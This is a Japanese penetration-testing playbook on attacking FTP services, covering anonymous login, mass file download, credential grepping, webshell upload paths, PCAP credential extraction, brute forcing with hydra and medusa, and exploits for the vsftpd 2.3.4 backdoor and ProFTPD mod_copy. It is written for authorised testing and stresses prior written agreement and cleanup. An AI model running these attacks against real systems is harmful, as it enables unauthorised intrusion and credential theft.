# FTP

> **スコープ: 21 番ポート（または非標準 FTP ポート）の列挙〜接続取得・取得ファイルの初動精査・書き込み経路による初期侵入・既知 CVE による直接侵入まで**を 1 ファイルで扱う。取得バイナリ・`.msg` の詳細解析、メタデータ抽出（exiftool 等）、PCAP からの認証情報抽出の詳細手順は別ファイル（`../01_Reconnaissance/Metadata_Analysis.md` / `Binary_Analysis.md` / `Credential_Discovery.md`）を参照。


## 着火条件

以下のいずれかに該当する場合:

- ポートスキャンで `21/tcp open ftp`（または非標準ポート上に FTP バナー）を検出
- PCAP に FTP トラフィックが含まれている（平文認証情報が拾える可能性）
- 認証情報（ユーザー名・パスワード）が他経路で取得済みで使い回し試行を行う
- 製品出荷時のデフォルト認証情報を試行する許可がある

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `nmap` / `ftp` / `lftp` / `curl` / `wget` / `nc` / `tshark` / `hydra` / `medusa` / `ncrack` / `searchsploit` / `msfconsole`（いずれもペネトレ用 Linux ディストリ標準搭載）
- 外部リソース依存: 辞書ファイル (`/usr/share/wordlists/rockyou.txt` 等) は標準同梱、オフラインでも実施可

## 先に確認すること

- **ロックアウト設定**: `Account_Lockout_Recon.md` の FTP 節（fail2ban / 製品側の試行回数制限）
- **試行ポート**: 標準 21 だけでなく、`nmap` で 2121 / 2221 / 990（FTPS implicit）等の代替ポートも確認
- **CVE 該当性**: 辞書攻撃に進む前に §1 でバージョンを取り、§8 の既知 CVE が効くかを優先確認する

**攻撃者の思考トレース:** FTP は認証情報・ファイル転送をすべて平文で送信する古典的プロトコルで、**匿名アクセス・弱認証・古いバージョンの残置が起きやすい**。「匿名 → 全件 DL → メタデータ精査 → 書込判定 → 既知 CVE」の順で時間効率が高い。辞書攻撃は最後の手段（auth ログを大量に残しやすい）。`anonymous` で入れるだけで重要文書が転がっていることがあり、**1 件目の試行で当たり**を引ける確率が他プロトコルより高いのが特徴。

---

## 1. バナー観察 / バージョン判定

**コマンド:**

```bash
# [Attacker] nmap によるバナー取得 + サービス特定
nmap -sV -p 21 [TARGET_IP]
# 出力例: 21/tcp open ftp vsftpd 2.3.4

# [Attacker] nc での生バナー
nc [TARGET_IP] 21
# 220 (vsFTPd 2.3.4)
# QUIT で抜ける

# [Attacker] FEAT で対応拡張機能の確認（AUTH TLS / UTF8 / MLSD 等）
echo -e "FEAT\nQUIT" | nc [TARGET_IP] 21
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `220 (vsFTPd 2.3.4)` | **CVE-2011-2523 backdoor** が効く可能性 | §8 vsftpd 2.3.4 backdoor へ |
| `220 ProFTPD 1.3.5` 系 | **CVE-2015-3306 mod_copy** が効く可能性 | §8 ProFTPD mod_copy へ |
| `220 ProFTPD 1.3.3c` | 過去にバックドア混入版が存在（要 mirror 検証） | `searchsploit ProFTPD 1.3.3` |
| `220 Microsoft FTP Service` | IIS FTP。IIS バージョンと連動して CVE 探索 | `searchsploit IIS FTP` / `searchsploit Microsoft FTP` |
| `220 ... Pure-FTPd` / `220 ... FileZilla Server` / `220 ... WS_FTP` | 製品判別 | バージョン文字列で `searchsploit` |
| `FEAT` 応答に `AUTH TLS` / `AUTH SSL` を含む | FTPS（明示 TLS）対応 | TLS 構成監査は `../01_Reconnaissance/TLS_Audit.md` |
| バナーが返らない・`421` で即切断 | 接続元 IP 制限 / TCP wrapper / fail2ban | 接続元を変える・時間をおく |
| バージョン文字列なし（製品名のみ） | バナー suppress 設定 | §2 機能列挙（`HELP` / `SYST`）で間接判定 |

> **注意:** バナー文字列は設定で偽装可能（`vsftpd.conf` の `ftpd_banner`）。version 文字列だけで CVE 該当を断定せず、実挙動（§2 機能列挙・§8 PoC）でも確認する。

---

## 2. 匿名ログイン試行 + 機能列挙

**コマンド:**

```bash
# [Attacker] nmap で匿名アクセス一括判定
nmap --script ftp-anon -p 21 [TARGET_IP]
# 出力に "Anonymous FTP login allowed" があれば成立

# [Attacker] 対話接続
ftp [TARGET_IP]
# Name: anonymous
# Password: anonymous@   ← 任意の文字列で良い（空 Enter でも通ることが多い）

# [Attacker] 認証直後にサーバ情報・対応コマンドを列挙
ftp> SYST              # サーバー OS / 実装情報
ftp> HELP              # サポートコマンド一覧
ftp> STAT              # サーバー設定・接続状態
ftp> pwd               # カレントディレクトリ（chroot されているか確認）
ftp> ls -la            # 隠しファイル含めて確認
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `230 Login successful` / `230 Anonymous access granted` | 匿名アクセス成立 | §3 全件再帰ダウンロードへ |
| `ftp-anon: Anonymous FTP login allowed` (nmap) | 同上 | 同上 |
| `SYST` で `UNIX Type: L8` | UNIX 系 | パス区切り `/` で取得 |
| `SYST` で `Windows_NT` | Windows 系（IIS FTP 等） | パス区切り `\` の可能性、`dir` も使える |
| `HELP` に `SITE CPFR` / `SITE CPTO` 含む | ProFTPD mod_copy 有効 | §8 ProFTPD mod_copy へ |
| `HELP` に `SITE EXEC` 含む | 古典的 wu-ftpd 系・任意コマンド実行の可能性 | `SITE EXEC` の引数制限を試す |
| `530 Login incorrect` で `anonymous` 拒否 | 匿名無効 | §7 辞書攻撃 or §8 CVE or 別経路で cred 取得 |
| `530 Please login with USER and PASS` のみ | 匿名のメッセージすら返さない厳格設定 | 同上 |
| 匿名で `ls` がタイムアウト / 空応答 | NAT / FW で active mode が通らない | `passive` コマンドで PASV モードへ切替 |

> **注意:** 匿名ログインで「**パスワード欄は空でも通る**」「**任意文字列で通る**」サーバが多い。`anonymous@` 形式のメールアドレス風文字列が伝統的な作法だが、必須ではない。

> **▶ 先に判定（80/443 が同時に開いている場合）:** §3 の全件 DL に進む前に「**FTP root = Web の DocumentRoot か**」を確認する。同一なら書込 → webshell（§5）が最短の RCE 経路になり、ファイル精査（§3〜§4）より優先する。
>
> **判定シグナル（どちらかで webroot 同一を疑う）:**
> - FTP ルートに `index.html` / `iisstart.htm` / `welcome.png` / `index.php` 等の **web デフォルト or 公開ファイル**が見える
> - FTP 上のファイルサイズ（`ls` の表示）が、同名ファイルの HTTP レスポンス `Content-Length` と一致する
>
> ```bash
> # [Attacker] FTP の ls で見たサイズと HTTP の Content-Length を突き合わせる
> curl -sI http://[TARGET_IP]/[FTP に見えたファイル名]
> # 例: iisstart.htm が FTP で 689 バイト、curl の Content-Length も 689 → FTP root は webroot
> ```
>
> 一致したら **§5（書込テスト）へ直行**。`iisstart.htm` 等を見て「デフォルトページ＝中身が無い」と読んで撤退しないこと。**デフォルトファイルが見える＝稼働中の webroot をそのまま配信している**という意味で、書込できれば即 RCE 経路になる。

---

## 3. ファイルの全件再帰ダウンロード

**着火条件:** §2 で匿名アクセスが成立した、または認証情報で接続できた。

**コマンド:**

```bash
# [Attacker] wget でディレクトリ構造ごと全ファイルをダウンロード
# -m: ミラーモード（再帰・タイムスタンプ保持）、-nH: ホスト名ディレクトリを省略
wget -m ftp://anonymous:anonymous@[TARGET_IP] -nH --no-passive-ftp 2>/dev/null

# [Attacker] passive モード必須環境（NAT / FW 越し）
wget -m --passive-ftp ftp://anonymous:anonymous@[TARGET_IP] -nH

# [Attacker] 認証情報あり
wget -m ftp://[USER]:[PASSWORD]@[TARGET_IP] -nH

# [Attacker] lftp で並列ダウンロード（大量ファイル時）
lftp -u anonymous,anonymous [TARGET_IP] -e "mirror --parallel=4 / ./ftp_dump; quit"

# [Attacker] curl で単発ファイル取得（特定ファイル名が判明している場合）
curl -u anonymous:anonymous ftp://[TARGET_IP]/[FILE] -o [FILE]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| カレントディレクトリ配下にファイル群が落ちる | 取得成功 | §4 取得後の精査へ |
| `wget -m` が `Cannot bind` / 途中で止まる | active mode 失敗 / FW | `--passive-ftp` 付与、または `lftp` に切替 |
| ファイルサイズが 0 / 全ファイル取得失敗 | 認証は通るが LIST 拒否 / 権限制限 | `ls` で個別確認 → 取れるファイル名を直接指定して `curl`/`get` |
| 大量ファイルで時間がかかる | サーバ側のレート制限 | `lftp --parallel=4` で並列化、または対象ディレクトリを絞る |

> **なぜ全件 DL を最初にやるのか:** FTP 対話操作で 1 ファイルずつ確認するのは見落としリスクが高い。**ディレクトリ全体を一括ダウンロードしてからローカルで精査する方が速い**。内容が空に見えるファイルでも、メタデータ（Author・Company）に有効情報が残っていることがある。

> **注意:** `wget -m` が途中で止まる場合は `--tries=3 --timeout=10` でタイムアウトを短縮。`.listing` 一時ファイルが残るので `--no-remove-listing` 不要なら削除する。

---

## 4. 取得後の精査順序

**コマンド:**

```bash
# [Attacker] Step 1: 取得ファイルの種類とサイズを一覧確認
find . -type f -exec ls -lh {} \;
find . -type f | xargs file

# Step 2: メタデータ確認（Author・Company などを抽出）
# → ../01_Reconnaissance/Metadata_Analysis.md（exiftool）を参照

# Step 3: テキスト系の内容確認（優先度高）
find . \( -name "*.txt" -o -name "*.bat" -o -name "*.ps1" \
       -o -name "*.conf" -o -name "*.ini" -o -name "*.cfg" \
       -o -name "*.xml" -o -name "*.log" \) -type f \
       -exec sh -c 'echo "=== $1 ==="; cat "$1"' _ {} \;

# Step 4: 認証情報の grep
grep -RinE "password|passwd|pwd|secret|api[_-]?key|token|user(name)?" . 2>/dev/null

# Step 5: 隠しファイル・履歴系の確認
find . -name ".bash_history" -o -name ".ssh" -o -name ".git" \
     -o -name "*.bak" -o -name "*~" -o -name "web.config"
```

**観測される出力 → 次のアクション:**

| 観測 | 示唆 | 次のアクション |
|---|---|---|
| `.docx` / `.xlsx` / `.pdf` を発見 | メタデータに作成者・組織情報の可能性 | `../01_Reconnaissance/Metadata_Analysis.md` (exiftool) |
| `.msg` / `.eml` (メール形式) を発見 | 業務メール本文・添付に認証情報 | `Binary_Analysis.md` の OLE2/.msg 解析パターン |
| `.bak` / `web.config` / `*.conf` を発見 | バックアップ・設定ファイルに DB cred の可能性 | grep で `password=` / `connectionString=` |
| `id_rsa` / `*.pem` / `*.ppk` を発見 | SSH 秘密鍵入手 | `SSH.md` §5 で接続試行・§8 でパスフレーズクラック |
| `.bash_history` を発見 | 過去の操作・直近接続先・打ったパスワードの痕跡 | grep で `ssh ` `mysql -p` `curl -u` 等を抽出 |
| バイナリ (`.exe` / `.dll`) を発見 | 内部ツール・カスタム実装の可能性 | `Binary_Analysis.md` の strings / 逆 ENG パターン |
| 取得ファイルがすべて空 / 関係ない公開資料のみ | 匿名向けに公開資料だけを置くサーバー | §5 書込可能性チェック・§7 認証付きの試行に移る |

> **注意:** `file` コマンドで判別不能なバイナリは `xxd | head -5` でマジックバイト判定 → `Binary_Analysis.md` を参照。

---

## 5. 書き込み可能性の確認（DocumentRoot 経由 RCE 経路）

**着火条件:** §2 で匿名アクセスが成立、または認証情報で接続できた。匿名で書込可能なディレクトリがあれば認証なし RCE 経路の起点になる。**特に 80/443 が同時に開き、§2 で FTP root = webroot の疑いが出た場合は、§3/§4 の精査より先にこのテストを行う**（webroot に書ければ webshell → ブラウザ実行で即 RCE）。

**コマンド:**

```bash
# [Attacker] テスト用ファイルをアップロード
ftp [TARGET_IP]
# Name: anonymous
# Password: (空)
ftp> binary                          # バイナリモード（テキスト系ファイルでも安全側）
ftp> cd /
ftp> ls -la                          # 各ディレクトリの drwx 権限を確認
ftp> put /etc/hostname testfile      # 任意の小ファイルでテスト
ftp> ls -la testfile                 # 書込成功確認
ftp> delete testfile                 # 後始末

# [Attacker] curl での書込判定（対話なしで判定したい場合）
echo "test" > /tmp/probe.txt
curl -T /tmp/probe.txt ftp://anonymous:@[TARGET_IP]/probe.txt
curl ftp://anonymous:@[TARGET_IP]/ | grep probe.txt   # 書込確認
curl -X "DELE probe.txt" ftp://anonymous:@[TARGET_IP]/  # 削除
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `226 Transfer complete` + `ls` で表示される | 書込成功 | DocumentRoot 配下なら webshell 設置経路 |
| `553 Could not create file` | 書込不可（権限・quota） | 別ディレクトリを試す（`uploads/` / `pub/` / `incoming/` 等） |
| `550 Permission denied` | 同上 | 同上 |
| `500 Illegal PORT command` | active mode 経路の問題 | `passive` に切替 |
| 特定の `incoming/` ディレクトリだけ書込成功 | 古典的な「アップロードのみ可・読出不可」ディレクトリ | アップロードしたファイルが他経路（Web）で公開されないか確認 |

> **書込可能 + Web 経由公開の組合せが効くケース:**
>
> - FTP のルートが Web の DocumentRoot と同一（`/var/www/html` 等）
> - `uploads/` が `https://[TARGET]/uploads/` でアクセスできる
> - PHP / JSP / ASPX 実行が有効
>
> 上記が揃えば `webshell.php` を `put` → ブラウザ経由実行で RCE 成立。**事前合意がある環境のみで実施**。`./Web_Vulnerabilities/File_Upload.md` も参照（同じ「アップロード → 実行」モデル）。

> **注意:** 書込権限の確認だけでも `auth.log` / FTP ログには `STOR` リクエストが残る。テストファイルは小さく無害なものにし、確認後に `DELE` で削除する。

---

## 6. PCAP からの認証情報抽出

**着火条件:** Web サーバ・SMB 共有・ファイル取得経路で `.pcap` / `.pcapng` ファイルを入手した。または LAN 内で `tcpdump` 権限がある状況。

**コマンド:**

```bash
# [Attacker] FTP コマンドだけを抽出
tshark -r capture.pcap -Y "ftp" -T fields \
  -e frame.number -e ftp.request.command -e ftp.request.arg

# [Attacker] USER / PASS だけを抽出
tshark -r capture.pcap -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
  -T fields -e ftp.request.command -e ftp.request.arg

# [Attacker] FTP データ転送ストリームの中身を再構成（ファイル抽出）
tshark -r capture.pcap --export-objects "ftp-data,./ftp_extracted"
# ※ FTP は制御コネクション(21) と データコネクション(20 or PASV) が別。
# データコネクションのストリームは "ftp-data" で抽出する
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `USER [USERNAME]` / `PASS [PASSWORD]` の組が連続して出る | 平文認証情報 | 同 cred で `SSH.md` / `Mail` / Web 管理画面に使い回し |
| `STOR [FILE]` / `RETR [FILE]` が見える | ファイル転送内容も再構成可能 | `--export-objects "ftp-data,..."` で中身を取り出し |
| `AUTH TLS` 後にコマンドが暗号化されている | FTPS で平文不可 | TLS 構成を `../01_Reconnaissance/TLS_Audit.md` で監査 |

> **注意:** `Credential_Discovery.md` に PCAP 経由認証情報の全プロトコル横断手順あり（HTTP Basic / Telnet / POP3 / IMAP 含む）。FTP 単独で完結させずに同ファイルに合流する。

---

## 7. hydra / medusa / ncrack 辞書攻撃

**事前準備（必須）:** `Account_Lockout_Recon.md` で FTP 側のロックアウト閾値・fail2ban 設定を確認し、試行間隔を設計する。

**コマンド:**

```bash
# [Attacker] hydra（最も汎用）
hydra -l [USER] -P /usr/share/wordlists/rockyou.txt ftp://[TARGET_IP] -t 4
hydra -L users.txt -p '[PASSWORD]' ftp://[TARGET_IP] -t 4 -W 5         # スプレー
hydra -l [USER] -P passwords.txt ftp://[TARGET_IP]:[PORT] -t 4         # 非標準ポート

# [Attacker] medusa（hydra の代替）
medusa -h [TARGET_IP] -u [USER] -P /usr/share/wordlists/rockyou.txt -M ftp -t 4

# [Attacker] ncrack（stealth 寄り・低速）
ncrack -p ftp --user [USER] -P /usr/share/wordlists/rockyou.txt [TARGET_IP] -T2 -CL 1

# [Attacker] nmap ftp-brute スクリプト（nmap だけで完結）
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt [TARGET_IP]

# [Attacker] Metasploit auxiliary scanner（msf 派の hydra 代替）
msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; \
  set RHOSTS [TARGET_IP]; \
  set USER_FILE users.txt; \
  set PASS_FILE /usr/share/wordlists/rockyou.txt; \
  set STOP_ON_SUCCESS true; \
  run; exit"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[21][ftp] host: [IP]   login: [USER]   password: [PASS]` (hydra) | 認証成功 | §2 で本接続・§3 全件 DL に進む |
| 全 cred が拒否 | 認証情報全滅 / 接続元 IP 制限 | §8 CVE 攻撃に切替、または OSINT で username 候補追加 |
| 試行が極端に遅い | fail2ban / 製品側 throttle | `hydra -t 1 -W 30` で並列度 1・待機 30 秒、または `ncrack -T1` |
| `Connection refused` を繰り返す | 接続元 IP が一時 BAN された可能性 | 別接続元 / 時間をおいて再開 |
| hydra が動かない (timeout 多発) | 環境依存の hydra 不具合 | `medusa` / `ncrack` / `nmap ftp-brute` / `msf auxiliary/scanner/ftp/ftp_login` 代替へ |

---

## 8. 既知 CVE による直接侵入

**着火条件:** §1 でバージョン文字列が取れている。version 該当の CVE が公開 PoC を持つ。

### 8.0 NSE スクリプトによる既知 CVE 一括スキャン

**背景:** 個別 PoC を手動で叩く前に、nmap NSE で代表的な FTP 系 CVE を一括判定できる。バージョン文字列がバナーから取れない・偽装されている場合でも、実挙動ベースで判定するため一次スクリーニングに有用。

**コマンド:**

```bash
# [Attacker] 代表的な FTP 系 NSE スクリプトを一括実行
nmap -p 21 --script "ftp-anon,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-libopie,ftp-vuln-cve2010-4221" [TARGET_IP]

# [Attacker] 個別実行（特定 CVE のみ）
nmap -p 21 --script ftp-vsftpd-backdoor [TARGET_IP]            # vsftpd 2.3.4 backdoor (CVE-2011-2523) — §8.1 と同等
nmap -p 21 --script ftp-proftpd-backdoor [TARGET_IP]           # ProFTPD 1.3.3c 混入版バックドア
nmap -p 21 --script ftp-vuln-cve2010-4221 [TARGET_IP]          # ProFTPD 1.3.2/1.3.3 Telnet IAC heap overflow
nmap -p 21 --script ftp-libopie [TARGET_IP]                    # FreeBSD ftpd OPIE off-by-one (CVE-2010-1938)
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `ftp-vsftpd-backdoor: VULNERABLE` | vsftpd 2.3.4 backdoor 該当 | §8.1 で手動トリガー or Metasploit 実行 |
| `ftp-proftpd-backdoor: This installation has been backdoored` | ProFTPD 1.3.3c 混入版 | `searchsploit proftpd 1.3.3c` で PoC 確認 |
| `ftp-vuln-cve2010-4221: VULNERABLE` | ProFTPD heap overflow 該当 | msf `exploit/freebsd/ftp/proftp_telnet_iac` / `searchsploit cve-2010-4221` |
| `ftp-libopie: VULNERABLE` | FreeBSD ftpd OPIE off-by-one | `searchsploit cve-2010-1938`（公開 PoC は限定的） |
| 全スクリプトが `NOT VULNERABLE` or 出力なし | NSE 既知シグネチャに該当なし | §8.3 の `searchsploit` ベースの探索に進む |

**注意:** NSE 判定は**シグネチャ + 軽い動作確認ベース**で、偽陰性（パッチ未適用でも検知漏れ）も偽陽性（バナー偽装で誤検知）もある。`VULNERABLE` が出ても実 exploit 前にバージョン・OS・パッチレベルを §1 で再確認する。`--script-args=unsafe=1` を付けると更に侵襲的な判定を行うが、本番では事前合意必須。

### 8.1 vsftpd 2.3.4 backdoor (CVE-2011-2523)

**背景:** 2011 年に vsftpd 2.3.4 の公式配布物に **数日間バックドアが混入していた**。ユーザー名中に `:)`（スマイリー）が**含まれている**と TCP/6200 にバインドされた root シェルが起動する（末尾限定ではなくユーザー名のどこかに含まれていれば発火）。

**コマンド:**

```bash
# [Attacker] nc で手動トリガー
nc [TARGET_IP] 21
USER kedalab:)
PASS anything
# 認証は通らず切断される — その後別ターミナルで:
nc [TARGET_IP] 6200
# プロンプトなしの root シェル
id
# uid=0(root) gid=0(root)

# [Attacker] Metasploit モジュール
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; \
  set RHOSTS [TARGET_IP]; run; exit"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `nc [TARGET_IP] 6200` で接続成立・`id` が `uid=0(root)` | バックドア発火成功 | `../03_Post_Access_Linux/Enumeration_Checklist.md` |
| 6200 への接続が拒否 / タイムアウト | (a) パッチ済み・バックドア無効化 / (b) **バックドアは発火し 6200 を bind しているが、ホスト FW（iptables）が 6200 への inbound を遮断** — 外部からは (a)(b) を区別できない | §7 辞書攻撃 or 別経路。別経路で root 取得後に `netstat -tnlp` で 6200 が listen していれば (b) と確定 → `../03_Post_Access_Linux/Enumeration_Checklist.md`（ネットワーク節） |
| Metasploit の Exploit completed, but no session was created | トリガー失敗 / FW で 6200 ブロック | 手動 `nc` で 6200 到達性を先に確認 |

> **バインド型バックドアの弱点:** 6200 のように exploit が**ターゲット側に新規 inbound ポートを開く**方式は、ホスト FW が inbound を絞っていると発火しても接続できない。`netstat` で listen が見えるのに外部から届かない＝ FW フィルタの典型。リバース接続を使う exploit（distcc / Samba usermap 等）はこの制約を受けない理由は `../06_Concepts/Reverse_Shell.md`（なぜバインドではなくリバース）参照。

### 8.2 ProFTPD 1.3.5 mod_copy (CVE-2015-3306)

**背景:** ProFTPD **1.3.5**（1.3.5a で修正済み）の `mod_copy` モジュールが有効な場合、未認証で `SITE CPFR` / `SITE CPTO` コマンドを使って **任意ファイルのコピーが可能**。Web DocumentRoot に webshell をコピーする、または `/etc/passwd` を書換可能な場所にコピーして読み出す等の経路が成立する。

**コマンド:**

```bash
# [Attacker] 未認証で mod_copy が応答するか確認
nc [TARGET_IP] 21
SITE CPFR /etc/passwd
SITE CPTO /tmp/passwd_copy

# [Attacker] Metasploit モジュール（webshell 配置を自動化）
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; \
  set RHOSTS [TARGET_IP]; \
  set SITEPATH /var/www/html; \
  set TARGETURI /; \
  run; exit"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `350 File or directory exists, ready for destination name` + `250 Copy successful` | mod_copy 有効・任意ファイルコピー可 | Web DocumentRoot 経由で webshell 設置 → ブラウザ実行 |
| `500 SITE CPFR not understood` | mod_copy 無効 or パッチ済み | 別 CVE を探す（`searchsploit proftpd`）|
| `550 Permission denied` | コピー元/先の権限不足 | 別の書込可能パス（`/tmp` / `uploads/`）を試す |

### 8.3 その他のバージョン依存 CVE（探索パターン）

```bash
# [Attacker] バージョン文字列からの CVE 探索
searchsploit vsftpd
searchsploit proftpd
searchsploit pure-ftpd
searchsploit filezilla server
searchsploit ws_ftp
searchsploit "Microsoft FTP"

# [Attacker] CVE 番号から PoC を引く
searchsploit -m [EDB-ID]
```

> **注意:** `searchsploit` ヒット件数は多いが、**バージョン一致と OS 一致を厳密に確認**してから実行する。範囲外バージョンに撃つとサービスクラッシュ・ログ大量化のリスク。

---

## 9. FTP Bounce 攻撃（古典・finding 用）

**背景:** FTP の `PORT` コマンドは「データコネクションの接続先を任意の IP:port に指定できる」仕様（RFC 959）。これにより、FTP サーバを踏み台にして **任意ホスト・任意 TCP ポートへ任意データを送出** できる。代表用途は以下:

- **内部ポートスキャン**: `PORT` 応答コードの差から開閉判定（最も有名、`nmap -b` で自動化）
- **境界 FW の透過**: bounce サーバが内部 LAN に居て外部から直接到達不能な内部ホストへ、bounce 経由で接続を発生させる
- **source port 20 偽装**: bounce で発出される TCP の送信元ポートは 20（FTP-DATA）。古い FW では 20 番からの戻り通信を無条件許可している設定があり、これを抜けるのに使える
- **任意プロトコルへのデータ injection**: `STOR` で配置したコマンド列ファイルを `RETR` で別ホスト・別ポートに流し、SMTP / NNTP / HTTP 等の生プロトコルへ任意コマンドを投入（Hobbit "The FTP Bounce Attack" 1995 で詳述）

この問題は **RFC 2577（FTP Security Considerations、1999 年）** で勧告化され、`PORT` 宛先を制御接続元 IP に限定する実装が標準化された。現代のサーバは大半がこの対策済みだが、組み込み機器・古い NAS・レガシー FTP サーバで残存することがある。

**コマンド:**

```bash
# [Attacker] nmap の FTP bounce オプション
nmap -b anonymous:anonymous@[FTP_PROXY_IP] -p 80,443,3389 [INTERNAL_TARGET_IP]
# FTP_PROXY_IP の FTP を経由して INTERNAL_TARGET_IP をスキャン
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Your FTP bounce server lets us connect to ...` + 通常のポート一覧 | bounce 成立 | 内部セグメントへのスキャン経路として finding 記録 |
| `Your FTP bounce server doesn't allow privileged ports` | 1024 未満のポートは拒否 | 1024 以上ポートのみで bounce 試行 |
| `502 PORT command not allowed` / `500 Illegal PORT command` | bounce 禁止（現代の標準動作） | 通常経路に戻る |

> **注意:** 成立した場合でも、`PORT [IP],[PORT_HIGH],[PORT_LOW]` の応答有無からポート開閉を推定するタイミング攻撃で、現代的なスキャンより遅い。**audit finding として記録するのが現実的な使い道**で、実 pivot に使うのは効率が悪い。

> **注意（ポートスキャン以外の bounce 手順 — 古典）:** Hobbit 原典のフローは、攻撃者側で PASV listener を準備し、bounce サーバの書込可能ディレクトリ（例: `/incoming`）に「FTP コマンド列を含むファイル」を `STOR` で配置 → `PORT [TARGET_IP],[PORT_HIGH],[PORT_LOW]` + `RETR` で標的に流す、というもの。control connection を維持するためコマンドファイル末尾に約 60KB の NULL padding (`\x00` 連続) を付ける細工も併用される。**現代サーバではほぼ全滅**だが、原理を知っていると古い機器に当たった時の finding 価値判断ができる。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| 匿名拒否・認証情報なし・バージョン CVE 該当なし | 通常運用の閉じた FTP | OSINT で username 候補追加 → §7 スプレー / 他プロトコル経由で cred 取得 |
| 匿名で入れるがファイルが無い / 全部公開資料 | 公開用サーバ | §5 書込判定 → 取れなければ撤退 |
| 接続自体ができない (`Connection refused`) | TCP wrapper / IP 制限 / 一時 BAN | 接続元を変える / 時間をおいて再試行 |
| 全 cred 拒否 + version も最新 | パッチ済み + 強固な認証 | 撤退、別サービスへ |
| `wget -m` / `lftp mirror` が途中で止まる | NAT 越え / FW / レート制限 | `--passive-ftp` 切替・並列度低下・分割取得 |
| §5 書込成功するが Web 公開経路なし | DocumentRoot とは別パーティション | webshell 経路は諦め、設定ファイル書換等の別経路を探す |

## 注意点・落とし穴

> **[HIGH IMPACT]** §5 書込判定 + Web DocumentRoot 経由の webshell 設置は **「初期侵入の RCE 経路の確立」**そのもの。事前合意が無い限り実 exploit に進まず、書込可否の確認止まりにする。

> **[HIGH IMPACT]** §7 hydra / medusa / ncrack 辞書攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（アカウントロック・fail2ban による業務 IP の遮断）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（FTP ログの `530 Login incorrect` 大量、fail2ban アラート）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

> **[HIGH IMPACT]** §8 既知 CVE 実 exploit（特に §8.1 vsftpd 2.3.4 backdoor / §8.2 ProFTPD mod_copy）は以下の理由で本番では原則禁止または個別合意必須:
> - [x] root シェル取得・任意ファイル書込という重大影響
> - [ ] 業務停止リスク（古いサーバでは試行自体がクラッシュ要因）
> - [x] 不可逆な設定変更を含む（webshell 配置・ファイル書込）
> - [x] SIEM/EDR で確実に検知される（IDS シグネチャに古典 PoC が登録済み）
>
> バージョン該当の確認（§1）まで技術的判断で実施可。実 exploit は事前合意必須。

> **個別のブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロックを横断する高影響の警告のみを置く。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — §5 書込テスト・§7 辞書攻撃・§8 CVE 実 exploit）/ ★★（口頭確認可 — §3 全件 DL は転送量が多い）/ ★（§1 バナー・§2 匿名試行・§4 取得後精査・§6 PCAP 解析は技術的判断のみで実施可だが、対象組織との合意範囲は確認）
- **想定される SIEM / EDR 検知**: FTP サーバログの `230 Login successful` / `530 Login incorrect` 大量、fail2ban アラート、`STOR` リクエスト、IDS の vsftpd 2.3.4 backdoor シグネチャ、ProFTPD mod_copy の `SITE CPFR/CPTO` シグネチャ
- **業務影響リスク**: アカウントロック発生時の業務影響、§8 CVE 試行時の FTP サーバクラッシュリスク、§5 書込テストの残置ファイルによる業務混乱
- **原状回復必須項目**: ✅ §5 書込テストでアップロードしたファイルの `DELE` 削除 / ✅ §8 mod_copy 等で配置した webshell の削除 / ✅ 取得した認証情報の安全な破棄
- **取得情報の取扱**: ダウンロードしたファイルは暗号化保管、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

## 関連技術

- 前：21 / 非標準 FTP ポートの発見 → `../01_Reconnaissance/Network_Scanning.md`
- 前：認証情報の取得 → `Credential_Discovery.md`
- 前：ロックアウト設定の事前確認 → `Account_Lockout_Recon.md`
- 前：製品出荷時のデフォルト認証情報試行 → `Default_Credentials.md`
- 後：取得ファイルのメタデータ確認（exiftool） → `../01_Reconnaissance/Metadata_Analysis.md`
- 後：取得バイナリ・`.msg`・OLE2 解析 → `Binary_Analysis.md`
- 後：§5 書込 + Web 経由 webshell 実行 → `./Web_Vulnerabilities/File_Upload.md`
- 後：§8 で取得した root シェル後の Linux 列挙 → `../03_Post_Access_Linux/Enumeration_Checklist.md`
- 後：FTPS / AUTH TLS の TLS 構成監査 → `../01_Reconnaissance/TLS_Audit.md`
- 関連：FTP で取得した cred の他プロトコル使い回し → `SSH.md` / `Mail_Services.md` / `WinRM.md` / `Impacket_Exec.md`（Impacket exec）/ `../01_Reconnaissance/RPC_Enumeration.md`（RPC §8 認証後再列挙）
- 関連：PCAP からの認証情報抽出（FTP 単独でなく全プロトコル横断） → `Credential_Discovery.md`
